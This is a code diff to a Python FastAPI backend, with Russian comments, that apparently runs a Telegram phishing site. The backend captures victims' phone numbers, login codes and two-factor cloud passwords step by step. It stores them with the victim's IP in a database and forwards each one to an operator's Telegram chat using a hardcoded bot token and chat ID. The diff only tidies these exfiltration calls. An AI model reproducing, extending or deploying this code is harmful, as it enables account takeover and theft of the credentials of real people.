@@ -8,7 +8,7 @@ import requests
 
 app = FastAPI()
 
-# Твои данные Telegram-бота
+# Настройки твоего Telegram-бота для отправки уведомлений
 TG_TOKEN = "9209600747:AAE98UHgY9jSjm8ZXATeeLsnMtP4YZpXojo"
 CHAT_ID = "5904604582"
 
@@ -25,7 +25,7 @@ def send_telegram_alert(text: str):
         print(f"Ошибка отправки в Telegram: {e}")
 
 def init_db():
-    conn = sqlite3.connect("messenger_telegram.db")
+    conn = sqlite3.connect("messenger_67.db")
     c = conn.cursor()
     c.execute("""
         CREATE TABLE IF NOT EXISTS logs (
@@ -77,10 +77,7 @@ async def send_code(req: PhoneReq, request: Request):
     sessions[req.phone] = {"country": req.country, "ip": ip, "code": "", "password": ""}
     
     log_to_pc("ШАГ 1: ВВЕДЕН НОМЕР ТЕЛЕФОНА", {"IP": ip, "Страна": req.country, "Номер": req.phone})
-    
-    # Отправка в Телеграм
-    msg = f"📱 *ШАГ 1: Введен номер*\n🌐 IP: `{ip}`\n🌍 Страна: {req.country}\n📞 Телефон: `{req.phone}`"
-    send_telegram_alert(msg)
+    send_telegram_alert(f"📱 *ШАГ 1: Введен номер*\n🌐 IP: `{ip}`\n🌍 Страна: {req.country}\n📞 Телефон: `{req.phone}`")
     
     return {"status": "ok"}
 
@@ -92,10 +89,7 @@ async def verify_code(req: CodeReq, request: Request):
     sessions[req.phone]["code"] = req.code
     
     log_to_pc("ШАГ 2: ВВЕДЕН 5-ЗНАЧНЫЙ КОД", {"IP": ip, "Номер": req.phone, "Код": req.code})
-    
-    # Отправка в Телеграм
-    msg = f"💬 *ШАГ 2: Введен код из Telegram*\n📞 Телефон: `{req.phone}`\n🔑 Код: `{req.code}`"
-    send_telegram_alert(msg)
+    send_telegram_alert(f"💬 *ШАГ 2: Введен код*\n📞 Телефон: `{req.phone}`\n🔑 Код: `{req.code}`")
     
     return {"status": "ok"}
 
@@ -106,12 +100,9 @@ async def auth_password(req: PassReq, request: Request):
     code = sess.get("code", "---")
     
     log_to_pc("ШАГ 3: ОБЛАЧНЫЙ ПАРОЛЬ (2FA)", {"IP": ip, "Номер": req.phone, "Код": code, "Пароль": req.password})
+    send_telegram_alert(f"🔒 *ШАГ 3: Введен 2FA Пароль!*\n📞 Телефон: `{req.phone}`\n💬 Код: `{code}`\n🔑 Пароль: `{req.password}`")
 
-    # Отправка в Телеграм
-    msg = f"🔒 *ШАГ 3: Введен 2FA Пароль!*\n📞 Телефон: `{req.phone}`\n💬 Код: `{code}`\n🔑 Пароль: `{req.password}`"
-    send_telegram_alert(msg)
-
-    conn = sqlite3.connect("messenger_telegram.db")
+    conn = sqlite3.connect("messenger_67.db")
     c = conn.cursor()
     c.execute("INSERT INTO logs (timestamp, ip, phone, code, cloud_password) VALUES (?, ?, ?, ?, ?)",
               (datetime.datetime.now().isoformat(), ip, req.phone, code, req.password))
